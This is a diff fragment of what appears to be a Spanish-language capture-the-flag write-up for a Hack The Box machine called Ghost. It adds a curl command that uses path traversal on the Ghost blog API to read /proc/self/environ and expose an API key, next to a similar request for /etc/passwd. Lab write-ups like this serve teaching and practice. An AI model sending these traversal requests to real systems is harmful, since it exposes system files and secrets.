@@ -324,3 +324,8 @@ curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../etc/pa
 
 
 `Una vez que el POC funcione, ahora podremos extraer la información que nos interesa. Aunque externamente es una máquina con Windows, ahora sabemos que ejecuta un contenedor Linux como servidor del Blog. Dado que menciona "Clave API denominada DEV_INTRANET_KEY almacenado como una variable de entorno ", luego podemos verificar el /proc/self/environ ruta para el sistema de archivos`
+
+```python
+curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../proc/self/environ&key=a5af628828958c976a3b6cc81a" | jq
+```
+
